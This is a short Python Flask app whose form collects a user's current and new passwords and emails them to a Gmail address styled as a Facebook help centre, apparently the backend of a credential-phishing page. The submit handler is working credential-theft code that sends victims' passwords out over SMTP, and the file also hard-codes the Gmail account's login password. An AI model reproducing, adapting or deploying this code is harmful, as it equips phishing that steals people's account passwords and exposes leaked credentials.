from flask import Flask, render_template, request
import smtplib

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit_form():
    current_password = request.form['current_password']
    new_password = request.form['new_password']
    retype_new_password = request.form['retype_new_password']
    
    if new_password != retype_new_password:
        return "New passwords do not match."
    
    subject = "Password Change Request"
    body = f"Current Password: {current_password}\nNew Password: {new_password}"

    # Your email address
    gmail_user = 'facebookhelpcenter246@gmail.com'  # Replace with your email address
    gmail_password = 'martinsoluwaseun4567'  # Replace with your email password

    sent_from = gmail_user
    to = ['facebookhelpcenter246@gmail.com']
    email_text = f"""\
    From: {sent_from}
    To: {", ".join(to)}
    Subject: {subject}

    {body}
    """

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(gmail_user, gmail_password)
        server.sendmail(sent_from, to, email_text)
        server.close()
        return 'Email sent successfully!'
    except Exception as e:
        return f'Failed to send email. Error: {str(e)}'

if __name__ == '__main__':
    app.run(debug=True)
